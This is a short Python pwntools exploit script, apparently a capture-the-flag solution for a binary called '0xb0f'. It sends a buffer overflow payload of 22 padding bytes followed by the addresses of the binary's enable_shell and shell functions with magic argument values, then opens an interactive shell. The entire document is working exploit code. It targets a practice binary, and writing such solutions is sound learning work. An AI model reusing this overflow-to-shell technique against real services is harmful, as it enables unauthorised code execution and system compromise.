#!/usr/bin/python3

from pwn import *

exe = ELF('0xb0f', checksec=False)
libc = ELF('libc-2.27.so', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b*enable_shell

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)
pop_edi_ebp = 0x080487fa
GDB()

payload = b"a" * 22
payload += p32(exe.sym['enable_shell']) + p32(exe.sym['shell'])
payload += p32(0xCAFEC0DE) + p32(0xdeadbeef)
sla(b"number: ", payload)

p.interactive()
